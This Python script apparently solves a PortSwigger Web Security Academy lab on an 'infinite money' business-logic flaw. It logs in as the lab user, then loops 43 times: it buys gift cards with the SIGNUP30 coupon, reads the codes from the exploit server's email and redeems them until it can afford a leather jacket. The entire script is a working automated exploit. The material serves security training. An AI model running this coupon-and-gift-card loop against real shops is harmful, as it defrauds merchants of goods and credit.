##############################################################################
#
# Lab: Infinite money logic flaw
#
# Hack Steps: 
#      1. Fetch the login page
#      2. Extract the csrf token and session cookie
#      3. Login as wiener
#      4. Fetch wiener's profile
#      5. Extract the csrf token needed for subsequent requests
#      6. Add 10 gift cards to the cart
#      7. Apply the coupon SIGNUP30
#      8. Place order
#      9. Fetch the email client
#     10. Collect the received gift card codes
#     11. Redeem the codes one by one
#     12. Repeat the stpes from 6 to 11 multiple times (after 43 times, 
#         you will have the price of the leather jacket and a little more)
#     13. Add the leather jacket the cart
#     14. Plac order
#     15. Confirm order
#
##############################################################################
import requests
import re
from colorama import Fore

LAB_URL = "https://0a87003c03792928815ddad6001200bc.web-security-academy.net" # Change this to your lab URL
EXPLOIT_DOMAIN = "exploit-0aec006d0318297481ccd97f017c00a1.exploit-server.net" # Change this to your exploit DOMAIN

def main():
    print("⦗1⦘ Fetching the login page.. ", end="", flush=True)
    
    login_page = fetch(f"{LAB_URL}/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)
    
    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. ", end="", flush=True)

    data = { "username": "wiener", "password": "peter", "csrf": csrf_token }
    cookies = { "session": session }
    login_as_wiener = post_data(f"{LAB_URL}/login", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Fetching wiener's profile.. ", end="", flush=True)

    session = login_as_wiener.cookies.get("session")
    cookies = { "session": session }
    wiener = fetch(f"{LAB_URL}/my-account", cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Extracting the csrf token needed for subsequent requests.. ", end="", flush=True)

    csrf = re.findall("csrf.+value=\"(.+)\"", wiener.text)[0]

    print(Fore.GREEN + "OK")
    
    # after 43 times you will have the price of the leather jacket and a little more
    for counter in range(1,44):
        print(Fore.WHITE + f"⦗6⦘ Adding 10 gift cards to the cart ({counter}/43).. ", end="", flush=True)
        
        data = { "productId": "2", "redir": "PRODUCT", "quantity": "10" }
        post_data(f"{LAB_URL}/cart", data, cookies)
      
        print(Fore.GREEN + "OK")
        print(Fore.WHITE + "⦗7⦘ Applying the coupon " + Fore.YELLOW + "SIGNUP30" + Fore.WHITE + ".. ", end="", flush=True)

        data = { "csrf": csrf, "coupon": "SIGNUP30" }
        post_data(f"{LAB_URL}/cart/coupon", data, cookies)
            
        print(Fore.GREEN + "OK")
        print(Fore.WHITE + "⦗8⦘ Placing order.. ", end="", flush=True)

        data = { "csrf": csrf }
        post_data(f"{LAB_URL}/cart/checkout", data, cookies)
        
        print(Fore.GREEN + "OK")
        print(Fore.WHITE + "⦗9⦘ Fetching the email client.. ", end="", flush=True)

        email_client = fetch(f"https://{EXPLOIT_DOMAIN}/email")
     
        print(Fore.GREEN + "OK")
        print(Fore.WHITE + "⦗10⦘ Collecting the received gift card codes.. ", end="", flush=True)

        codes = collect_codes(email_client)

        print(Fore.GREEN + "OK")

        for (index, code) in enumerate(codes):
            print(Fore.WHITE + "⦗11⦘ Redeeming the code " + Fore.YELLOW + code + Fore.WHITE + f" ({(index + 1)}/10).. ", end="\r", flush=True)

            data = { "csrf": csrf, "gift-card": code }
            post_data(f"{LAB_URL}/gift-card", data, cookies=cookies)
                
            # when you finish
            if index == 9:
                print(Fore.WHITE + "⦗11⦘ Redeeming the code " + Fore.YELLOW + code + Fore.WHITE + f" ({index + 1}/10).. " + Fore.GREEN + "OK")

    print(Fore.WHITE + "⦗12⦘ Adding the leather jacket cards to the cart.. ", end="", flush=True)
    
    data = { "productId": "1", "redir": "PRODUCT", "quantity": "1" }
    post_data(f"{LAB_URL}/cart", data, cookies=cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗13⦘ Placing order.. ", end="", flush=True)

    data = { "csrf": csrf}
    post_data(f"{LAB_URL}/cart/checkout", data, cookies=cookies)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗14⦘ Confirming order.. ", end="", flush=True)
    
    fetch(f"{LAB_URL}/cart/order-confirmation?order-confirmed=true", cookies=cookies)
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(url, cookies = None):
    try:  
        return requests.get(url, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + url + " through exception")
        exit(1)


def post_data(url, data, cookies = None):
    try:    
        return requests.post(url, data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + url + " through exception")


def collect_codes(response):
    last_ten_codes = []
    codes = re.findall("Your gift card code is:\s*(.*)\s*Thanks,", response.text)
    for index in range(0,10):
        last_ten_codes.append(codes[index])
    
    return last_ten_codes


if __name__ == "__main__":
    main()
